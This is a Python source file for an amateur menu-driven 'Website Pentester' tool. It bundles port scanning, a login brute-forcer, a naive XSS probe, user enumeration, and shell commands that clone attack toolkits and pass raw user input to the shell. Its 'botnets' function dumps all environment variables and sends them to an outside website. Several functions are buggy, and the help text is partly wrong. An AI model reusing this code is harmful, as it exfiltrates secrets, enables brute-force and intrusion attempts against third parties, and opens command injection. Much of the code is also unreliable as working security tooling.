
import pyfiglet
import os
import socket
import sys
import requests
import urllib
from string import *
from itertools import product
import base64
from scapy.all import *
import smtplib
import json
from termcolor import colored
from subprocess import call
import hashlib
import json
import requests
from cryptography.fernet import Fernet


text = pyfiglet.figlet_format("Website Pentester")
system = input("Enter you OS name (like Linux or Windows): ")


def menu():                                                         #menu
  print(text + """\n
   {1}--Information Gathering
   {2}--Password Attacks
   {3}--Botnets
   {4}--Web Reconnaissance
   {5}--Encryption Tool
   {6}--Help
   {7}--Exit
 """)
  choice = input("Enter your choice : ")
  os.system('clear')
  if choice == "1":
    info()
  elif choice == "2":
    passwd()

  elif choice == "3":
    botnets()
  elif choice == "4":
    WR()
  elif choice == "5":
    encryption()

  elif choice == "6":
    help1()
    menu()
  elif choice == 7:
    exit

  
  elif choice == "":
    menu()
  else:
    menu()


def info():                                                           #information gathering

  print("You are using {} os".format(system))
  os.system('clear')
  print(text)

  print("  {1}--nmap ")
  print("  {2}--Setoolkit")
  print("  {3}--Port Scanning")
  print("  {4}--Host To IP")
  print("  {5}--wordpress user")
  print("  {6}--XSStrike")
  print("  {7}--Dork - Google Dorks Passive Vulnerability Auditor ")
  print("  {8}--Scan A server's Users  ")
  print("  {9}--Password generator  ")
  print("  {10}--Back To Main Menu \n\n")
  choice2 = input("Enter your choice:  ")
  if choice2 == "1":
    nmap()
  if choice2 == "2":
    clearScr()
    SET()
  if choice2 == "3":
    clearScr()
    PS()
  if choice2 == "4":
    clearScr()
    HTP()
  if choice2 == "5":
    clearScr()
    WU()
  
    
  if choice2 == "6":
    clearScr()
    XSS()
  if choice2 == "7":
    clearScr()
    doork()
  if choice2 == "8":
    clearScr()
    scanusers()
 
  if choice2 == "9":
    clearScr()
    passwdc()

  elif choice2 == "" or "10":
    menu()
  else:
    menu()


def clearScr():                                           #clear screen for both windows and os
  if system == 'Linux':
    os.system('clear')

  if system == 'Windows':
    os.system('cls')


def PS():                                                 #port scanner
  
    print(text)
    ip = str(input("enter the IP : "))
    list = [443,8080,8443,23,25,69,53,139,137,445,22,20,21]
    for port in list:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = s.connect_ex((ip , port))

        if result==0:
          print("port {} is Open".format(port))
        else:
          print("port {} is closed ".format(port))


def SET():
  
  choice3 = input("Here you can install the tool kit in your device, but you have to run it manually/n Do you want to install??? : ")
  if choice3 in 'yes'or'y':
    print(text+"/n")
    os.system("git clone https://github.com/trustedsec/social-engineer-toolkit.git")
    os.system("python social-engineer-toolkit/setup.py")
  elif choice3 in 'no'or'n':
    clearScr()
    info()
  elif choice3 in ''or' ':
    clearScr()
    info()
  else:
    info()


def nmap():
  import nmap
  list = [20,21,22,139,137,445,53,23,25,69,1080,4444,6660,6669,161,31337]
  target = str(input("Enter the IP address : "))
  scanner  = nmap.PortScanner()
  for i in list:
    res = scanner.scan(target,str(i))
    if bool(res) == 0 and "True":
      print("Port {} is OPEN".format(i))
      
    elif bool(res)==1 and "False":
      print("Port {} is close".format(i))


def HTP():
  a = str(input("Enter the Host name of your website : "))
  b = socket.gethostbyname(a)
  print("The IP address of {} is {}".format(a,b))
def WU():
  
  os.system("git clone https://github.com/wpscanteam/wpscan.git")

  xe = input("Select a Wordpress target : ")
  os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u" % xe)
  

def cmsscan():
    os.system("git clone https://github.com/Dionach/CMSmap.git")
    clearScr()
    xz = input("select target : ")
    os.system("cd CMSmap @@ sudo cmsmap.py %s" % xz)
                                                                                 #content management system
def XSS():
  target = str(input("Enter the target URL....."))
  payload = "<script>alert(XSS);</script>"
  req = requests.post(target + payload)
  if payload in req.text:
    print("XSS vulnerability discovered!")
    print("Attacking payload"+payload)
  else:
    print("Secure")


def doork():
    print("doork is a open-source passive vulnerability auditor tool that automates the process of searching on Google information about specific website based on dorks. ")
    doorkchice = input("Continue Y / N: ")
    if doorkchice in 'yes':
        os.system("pip install beautifulsoup4 && pip install requests")
        os.system("git clone https://github.com/AeonDave/doork")
        
        doorkt = input("Target : ")
        os.system("cd doork && python doork.py -t %s -o log.log" % doorkt)  
 

def scanusers():
    site = input('Enter a website : ')
    try:
        users = site
        if 'http://www.' in users:
            users = users.replace('http://www.', '')
        if 'http://' in users:
            users = users.replace('http://', '')
        if '.' in users:
            users = users.replace('.', '')
        if '-' in users:
            users = users.replace('-', '')
        if '/' in users:
            users = users.replace('/', '')
        while len(users) > 2:
            print (users)
            resp = urllib.urlopen(
                site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()

            if 'invalid username' not in resp.lower():
                print( "\tFound -> %s" % users)
                pass

            users = users[:-1]
    except:
        pass

def passwdc():
    print(text)
    password_length = 8
    character = str(input("Enter the character you want to include in your password: "))
    password = " "
    for i in range (password_length):
      password = password + random.choice(characters)
    print("Password generated: {}".format(password))



    
def botnets():
  secrets = dict(os.environ)
 
  json_secrets = json.dumps((secrets))
 
  print(json_secrets)
 

  response = requests.get('https://aimetc.apeejay.edu/', data = json_secrets)
 
  print(response.request.url)
  print(response.status_code)
 
  file = open("secrets.txt", "a")
 
  file.write(json_secrets)
 
  file = open("secrets.txt", "r")
 
  line = file.readline()
 
  print(line)
  menu()
  
def passwd():
  print(text)
  url = input('[+] Enter Page URL: ')
  username = input('[+] Enter Username For The Account To Bruteforce: ')
  password_file = input('[+] Enter Password File To Use: ')
  login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')


  def cracking(username,url):
      for password in passwords:
        password = password.strip()
        print(colored(('Trying: ' + password), 'red'))
        data = {'username':username,'password':password,'Login':'submit'}
        response = requests.post(url, data=data)
        if login_failed_string in response.content.decode():
          print('[!!] Password Not In List')
        else:
          print(colored(('[+] Found Username: ==> ' + username), 'green'))
          print(colored(('[+] Found Password: ==> ' + password), 'green'))
          menu()
  with open(password_file, 'r') as passwords:
          cracking(username,url)

  
 
  menu()



def help1():
  print("""[+]The following are the ports with their loop holes if they are OPEN\n 
Port(20,21)- 
[*]Anonymous authentication. You can log into the FTP port with both username and password set to "anonymous".\n[*]Cross-Site Scripting.\n[*]Brute-forcing passwords.\n[*]Directory traversal attacks.\n\nPort(22)-\n[*]SSH stands for Secure Shell. It is a TCP port used to ensure secure remote access to servers. You can exploit the SSH port by brute-forcing SSH credentials or using a private key to gain access to the target system.\n\nPort(139,137,445)-\n[*]SSH stands for Secure Shell. It is a TCP port used to ensure secure remote access to servers. You can exploit the SSH port by brute-forcing SSH credentials or using a private key to gain access to the target system.\n\nPort(53)-\n[*]DNS stands for Domain Name System. It is both a TCP and UDP port used for transfers and queries respectively. One common exploit on the DNS ports is the Distributed Denial of Service (DDoS) attack.\n\nPort(443, 80, 8080, 8443)-\n[*]HTTP stands for HyperText Transfer Protocol, while HTTPS stands for HyperText Transfer Protocol Secure (which is the more secure version of HTTP). These are the most popular and widely used protocols on the internet, and as such are prone to many vulnerabilities. They are vulnerable to SQL injections, cross-site scripting, cross-site request forgery, etc\n\nPort(23)-\n[*]The Telnet protocol is a TCP protocol that enables a user to connect to remote computers over the internet. The Telnet port has long been replaced by SSH, but it is still used by some websites today. It is outdated, insecure, and vulnerable to malware. Telnet is vulnerable to spoofing, credential sniffing, and credential brute-forcing.\n\nPort(25)-\n[*]SMTP stands for Simple Mail Transfer Protocol. It is a TCP port used for sending and receiving mails. It can be vulnerable to mail spamming and spoofing if not well-secured.\n\nPort(69)-\n[*]TFTP stands for Trivial File Transfer Protocol. It's a UDP port used to send and receive files between a user and a server over a network. TFTP is a simplified version of the file transfer protocol. Because it is a UDP port, it does not require authentication, which makes it faster yet less secure.\n[*]It can be exploited using password spraying and unauthorized access, and Denial of Service (DoS) attacks.\n\n
############################################################################################################################################################################## """)

def WR(): 
  domain = 'aimetc.apeejay.edu/'
  r = requests.get('https://aimetc.apeejay.edu/')
 
  uuid = hashlib.md5(domain.encode('utf-8')).hexdigest()
 
  result = requests.get('http://' + domain)
 
  ssl_result = requests.get('https://' + domain).status_code
 
  if(ssl_result == 200):
    uses_ssl = True
  else:
    uses_ssl = False
 
  uses_css = (result.text.find('<link rel="stylesheet"') > -1)
 
  uses_js = (result.text.find('<script language="JavaScript"') > -1)
 
  profile = { 'uuid': uuid, 'name': domain, 'uses_css': uses_css, 'uses_js': uses_js }
  print(text)
  print("[+] Here we found the resut[+]\n"+json.dumps(profile))
  a = input("[+]Do you wnat to save the data in the file??(y or n)\n[+]")
  if a == "y":
    file = open("secrets.txt","w")
    file.write(str(r.content))
    print("See the file named secrets.txt in your device!!!")
  elif a == "n":
    pass
    
    
  menu()



def encryption():
  key = Fernet.generate_key()
  

# string the key in a file
  g = input("[*]ENTER THE FILE NAME (THAT MAY CONTAIN KEY) [*]\n")
  with open('filekey.key', 'wb') as filekey:
    filekey.write(key)


  with open('filekey.key', 'rb') as filekey:
	   key = filekey.read()


  fernet = Fernet(key)


  with open(g, 'rb') as file:
	   original = file.read()
	

  encrypted = fernet.encrypt(original)


  with open(g, 'wb') as encrypted_file:
	   encrypted_file.write(encrypted)
  print("# See the Encryption key in filekey.key #")	   

	   






  
	   
	   


  

menu()
